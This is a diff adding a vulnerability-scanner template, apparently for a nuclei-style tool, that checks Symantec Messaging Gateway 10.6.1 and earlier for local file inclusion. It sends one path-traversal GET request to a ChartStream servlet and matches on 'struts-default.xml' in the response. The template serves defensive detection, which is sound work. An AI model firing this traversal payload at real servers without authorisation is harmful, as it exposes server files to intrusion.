@@ -1,0 +1,22 @@
+id: symantec-messaging-gateway
+name: Symantec Messaging Gateway <=10.6.1 - Local File Inclusion
+severity: high
+confidence: tentative
+description: Symantec Messaging Gateway 10.6.1 and prior are vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- lfi
+- messaging
+- symantec
+- vuln
+requests:
+- method: GET
+  path: /brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/
+  matchers:
+  - type: body
+    words:
+    - struts-default.xml
+  - type: status
+    status:
+    - 200
+  condition: and
